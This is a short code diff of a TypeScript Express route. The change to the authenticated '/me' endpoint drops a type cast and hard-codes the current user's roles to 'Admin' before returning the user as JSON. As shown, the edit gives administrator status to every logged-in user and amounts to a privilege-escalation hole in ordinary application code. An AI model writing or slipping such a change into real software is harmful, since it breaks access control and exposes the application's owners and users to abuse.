@@ -6,7 +6,9 @@ import { AuthUser, Storage } from "../data";
 export const userRouter = express.Router();
 
 userRouter.get("/me", RequiresAuthentication, async (req: Request, res: Response) => {
-    let currentUser = req.user as AuthUser;
+    let currentUser = req.user;
+    currentUser.roles = ["Admin"];
+
     return res.json({ data: currentUser });
 });
 
